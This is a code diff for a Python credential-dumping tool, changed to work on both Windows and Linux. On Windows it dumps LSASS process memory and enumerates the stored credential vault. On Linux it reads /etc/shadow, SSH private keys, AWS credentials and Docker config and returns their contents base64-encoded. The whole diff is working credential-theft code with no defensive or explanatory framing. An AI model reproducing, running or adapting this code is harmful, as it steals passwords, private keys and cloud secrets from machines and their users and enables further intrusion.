@@ -9,34 +9,39 @@ import win32crypt
 import struct
 import hashlib
 import base64
+import platform
 from datetime import datetime
 from ctypes import wintypes
 import psutil
 
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
+
 class CredentialDump:
     def __init__(self):
-        self.setup_logging()
-        
-    def setup_logging(self):
-        logging.basicConfig(
-            level=logging.INFO,
-            format='%(asctime)s - %(levelname)s - %(message)s',
-            handlers=[
-                logging.FileHandler('credential_dump.log'),
-                logging.StreamHandler()
-            ]
-        )
+        self.os_type = platform.system()
         
     def check_admin(self):
         """Check if running with admin privileges"""
         try:
-            return ctypes.windll.shell32.IsUserAnAdmin()
-        except:
+            if self.os_type == 'Windows':
+                return ctypes.windll.shell32.IsUserAnAdmin()
+            else:
+                return os.geteuid() == 0
+        except Exception as e:
+            logging.error(f"Error checking admin privileges: {str(e)}")
             return False
             
     def get_lsass_handle(self):
         """Get handle to LSASS process"""
         try:
+            if self.os_type != 'Windows':
+                logging.error("LSASS dump only available on Windows")
+                return None
+                
             lsass_pid = None
             for proc in psutil.process_iter(['pid', 'name']):
                 if proc.info['name'].lower() == 'lsass.exe':
@@ -52,8 +57,14 @@ class CredentialDump:
                 False,
                 lsass_pid
             )
-            return process_handle
             
+            if process_handle:
+                logging.info(f"Successfully obtained LSASS handle (PID: {lsass_pid})")
+                return process_handle
+            else:
+                logging.error("Failed to get LSASS handle")
+                return None
+                
         except Exception as e:
             logging.error(f"Error getting LSASS handle: {str(e)}")
             return None
@@ -61,13 +72,27 @@ class CredentialDump:
     def dump_lsass(self, output_file=None):
         """Dump LSASS process memory"""
         try:
+            if self.os_type != 'Windows':
+                return {
+                    'status': 'error',
+                    'error': 'LSASS dump only available on Windows',
+                    'timestamp': datetime.now().isoformat()
+                }
+                
             if not self.check_admin():
-                logging.error("Admin privileges required")
-                return False
+                return {
+                    'status': 'error',
+                    'error': 'Admin privileges required for LSASS dump',
+                    'timestamp': datetime.now().isoformat()
+                }
                 
             handle = self.get_lsass_handle()
             if not handle:
-                return False
+                return {
+                    'status': 'error',
+                    'error': 'Failed to get LSASS handle',
+                    'timestamp': datetime.now().isoformat()
+                }
                 
             if not output_file:
                 timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -81,30 +106,38 @@ class CredentialDump:
                 
             win32api.CloseHandle(handle)
             logging.info(f"LSASS dump saved to {output_file}")
-            return True
+            
+            return {
+                'status': 'success',
+                'message': f'LSASS dump saved to {output_file}',
+                'timestamp': datetime.now().isoformat(),
+                'file': output_file
+            }
             
         except Exception as e:
-            logging.error(f"Error dumping LSASS: {str(e)}")
-            return False
-            
-    def extract_credentials(self, dump_file):
-        """Extract credentials from LSASS dump"""
-        try:
-            # Implementation of credential extraction
-            # This is a simplified version
-            pass
-        except Exception as e:
-            logging.error(f"Error extracting credentials: {str(e)}")
-            return None
+            error_msg = f"Error dumping LSASS: {str(e)}"
+            logging.error(error_msg)
+            return {
+                'status': 'error',
+                'error': error_msg,
+                'timestamp': datetime.now().isoformat()
+            }
             
     def get_windows_credentials(self):
         """Get Windows stored credentials"""
         try:
+            if self.os_type != 'Windows':
+                return {
+                    'status': 'error',
+                    'error': 'Windows credential dump only available on Windows',
+                    'timestamp': datetime.now().isoformat()
+                }
+                
             credentials = []
-            cred_type = win32crypt.CRED_TYPE_GENERIC
+            cred_count = 0
             
             # Enumerate credentials
-            for cred in win32crypt.CredEnumerate(None, cred_type):
+            for cred in win32crypt.CredEnumerate(None, 0):
                 try:
                     target = cred['TargetName']
                     username = cred['UserName']
@@ -114,101 +147,133 @@ class CredentialDump:
                         credentials.append({
                             'target': target,
                             'username': username,
-                            'password': credential_blob.decode('utf-16')
+                            'password': base64.b64encode(credential_blob).decode(),
+                            'type': cred['Type']
                         })
+                        cred_count += 1
                 except Exception as e:
                     logging.error(f"Error processing credential: {str(e)}")
                     continue
-                    
-            return credentials
+            
+            logging.info(f"Successfully retrieved {cred_count} credentials")
+            return {
+                'status': 'success',
+                'message': f'Retrieved {cred_count} credentials',
+                'timestamp': datetime.now().isoformat(),
+                'credentials': credentials
+            }
             
         except Exception as e:
-            logging.error(f"Error getting Windows credentials: {str(e)}")
-            return None
+            error_msg = f"Error getting Windows credentials: {str(e)}"
+            logging.error(error_msg)
+            return {
+                'status': 'error',
+                'error': error_msg,
+                'timestamp': datetime.now().isoformat()
+            }
             
-    def get_sam_dump(self):
-        """Dump SAM database"""
+    def get_linux_credentials(self):
+        """Get Linux stored credentials"""
         try:
+            if self.os_type != 'Linux':
+                return {
+                    'status': 'error',
+                    'error': 'Linux credential dump only available on Linux',
+                    'timestamp': datetime.now().isoformat()
+                }
+                
             if not self.check_admin():
-                logging.error("Admin privileges required")
-                return False
+                return {
+                    'status': 'error',
+                    'error': 'Root privileges required for Linux credential dump',
+                    'timestamp': datetime.now().isoformat()
+                }
                 
-            # Implementation of SAM dumping
-            # This is a simplified version
-            pass
+            credentials = []
+            
+            # Check for stored credentials in common locations
+            credential_files = [
+                '/etc/shadow',
+                '~/.ssh/id_rsa',
+                '~/.aws/credentials',
+                '~/.docker/config.json'
+            ]
+            
+            for cred_file in credential_files:
+                expanded_path = os.path.expanduser(cred_file)
+                if os.path.exists(expanded_path):
+                    try:
+                        with open(expanded_path, 'r') as f:
+                            content = f.read()
+                            credentials.append({
+                                'source': cred_file,
+                                'content': base64.b64encode(content.encode()).decode()
+                            })
+                    except Exception as e:
+                        logging.error(f"Error reading {cred_file}: {str(e)}")
+                        
+            logging.info(f"Successfully checked {len(credential_files)} potential credential sources")
+            return {
+                'status': 'success',
+                'message': f'Checked {len(credential_files)} credential sources',
+                'timestamp': datetime.now().isoformat(),
+                'credentials': credentials
+            }
             
         except Exception as e:
-            logging.error(f"Error dumping SAM: {str(e)}")
-            return False
-            
-    def get_ntds_dump(self):
-        """Dump NTDS database"""
-        try:
-            if not self.check_admin():
-                logging.error("Admin privileges required")
-                return False
-                
-            # Implementation of NTDS dumping
-            # This is a simplified version
-            pass
-            
-        except Exception as e:
-            logging.error(f"Error dumping NTDS: {str(e)}")
-            return False
-            
-    def save_credentials(self, credentials, output_file=None):
-        """Save credentials to file"""
-        try:
-            if not output_file:
-                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                output_file = f"credentials_{timestamp}.txt"
-                
-            with open(output_file, 'w') as f:
-                for cred in credentials:
-                    f.write(f"Target: {cred['target']}\n")
-                    f.write(f"Username: {cred['username']}\n")
-                    f.write(f"Password: {cred['password']}\n")
-                    f.write("-" * 50 + "\n")
-                    
-            logging.info(f"Credentials saved to {output_file}")
-            return True
-            
-        except Exception as e:
-            logging.error(f"Error saving credentials: {str(e)}")
-            return False
+            error_msg = f"Error getting Linux credentials: {str(e)}"
+            logging.error(error_msg)
+            return {
+                'status': 'error',
+                'error': error_msg,
+                'timestamp': datetime.now().isoformat()
+            }
 
 def dump_credentials():
-    """
-    Main function to dump credentials from various sources
-    Returns a dictionary containing all gathered credentials
-    """
+    """Main function to dump credentials from various sources"""
     try:
         dumper = CredentialDump()
         results = {
-            "status": "success",
-            "windows_credentials": [],
-            "lsass_dump": False,
-            "sam_dump": False,
-            "ntds_dump": False,
-            "timestamp": datetime.now().isoformat()
+            'status': 'success',
+            'timestamp': datetime.now().isoformat(),
+            'platform': platform.system(),
+            'is_admin': dumper.check_admin(),
+            'data': {}
         }
         
-        # Get Windows stored credentials
-        win_creds = dumper.get_windows_credentials()
-        if win_creds:
-            results["windows_credentials"] = win_creds
+        if platform.system() == 'Windows':
+            # Get Windows credentials
+            win_creds = dumper.get_windows_credentials()
+            results['data']['windows_credentials'] = win_creds
             
-        # Try LSASS dump if running as admin
-        if dumper.check_admin():
-            results["lsass_dump"] = dumper.dump_lsass()
-            results["sam_dump"] = dumper.get_sam_dump()
-            results["ntds_dump"] = dumper.get_ntds_dump()
+            # Only attempt LSASS dump if we have admin privileges
+            if dumper.check_admin():
+                lsass_result = dumper.dump_lsass()
+                results['data']['lsass_dump'] = lsass_result
+        else:
+            # Get Linux credentials
+            linux_creds = dumper.get_linux_credentials()
+            results['data']['linux_credentials'] = linux_creds
             
-        return results
-        
+        # Check if we got any credentials
+        if any(results['data'].values()):
+            logging.info("Successfully gathered credentials")
+            return results
+        else:
+            logging.warning("No credentials could be gathered")
+            return {
+                'status': 'info',
+                'message': 'No credentials could be gathered',
+                'timestamp': datetime.now().isoformat(),
+                'platform': platform.system(),
+                'is_admin': dumper.check_admin()
+            }
+            
     except Exception as e:
+        error_msg = f"Error during credential dump: {str(e)}"
+        logging.error(error_msg)
         return {
-            "status": "error",
-            "error": str(e),
-            "timestamp": datetime.now().isoformat()
+            'status': 'error',
+            'error': error_msg,
+            'timestamp': datetime.now().isoformat()
         } 
